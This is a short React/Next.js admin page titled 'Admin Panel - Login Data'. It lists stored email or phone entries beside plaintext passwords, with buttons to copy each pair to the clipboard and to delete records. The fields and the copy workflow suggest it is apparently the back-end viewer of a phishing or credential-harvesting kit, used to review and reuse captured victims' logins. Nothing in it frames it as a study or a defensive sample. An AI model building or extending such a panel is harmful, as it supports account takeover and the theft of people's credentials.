"use client";

import { useState, useEffect } from "react";

export default function AdminPage() {
  const [data, setData] = useState([]);
  const [copyStep, setCopyStep] = useState(null);

  useEffect(() => {
    fetch("/api/data")
      .then((res) => res.json())
      .then((data) => setData(data));
  }, []);

  const handleCopy = async (email, password) => {
    setCopyStep("email");
    await navigator.clipboard.writeText(email);
    setTimeout(() => {
      setCopyStep("password");
      navigator.clipboard.writeText(password);
      setTimeout(() => setCopyStep(null), 500);
    }, 500);
  };

  const handleDelete = async (id) => {
    await fetch("/api/data", {
      method: "DELETE",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id }),
    });
    setData(data.filter((item) => item._id !== id));
  };

  return (
    <div className="admin-container">
      <h1>Admin Panel - Login Data</h1>
      {data.length === 0 ? (
        <p className="empty-message">No data yet.</p>
      ) : (
        <table className="admin-table">
          <thead>
            <tr>
              <th>#</th>
              <th>Email/Phone</th>
              <th>Password</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            {data.map((item, index) => (
              <tr key={item._id}>
                <td>{index + 1}</td>
                <td>{item.email}</td>
                <td>{item.password}</td>
                <td>
                  <button
                    className="btn btn-copy"
                    onClick={() => handleCopy(item.email, item.password)}
                  >
                    {copyStep === "email" ? "Copying Email..." : copyStep === "password" ? "Copied Password" : "Copy"}
                  </button>
                  <button
                    className="btn btn-delete"
                    onClick={() => handleDelete(item._id)}
                  >
                    Delete
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      )}
    </div>
  );
}
